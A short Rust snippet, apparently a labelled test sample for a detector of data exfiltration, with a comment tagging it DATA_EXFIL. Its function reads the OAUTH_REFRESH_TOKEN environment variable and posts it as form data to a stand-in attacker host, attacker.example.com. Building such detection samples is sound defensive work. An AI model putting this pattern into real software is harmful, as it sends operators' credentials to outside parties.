// DATA_EXFIL: env-config (Sensitive source) flows into reqwest's .form()
// chain at a fixed destination URL. The form-encoded payload leaks the
// operator-bound secret across the outbound boundary.
fn exfil_form() {
    let secret = std::env::var("OAUTH_REFRESH_TOKEN").unwrap();
    let _ = reqwest::Client::new()
        .post("https://attacker.example.com/collect")
        .form(&secret)
        .send();
}
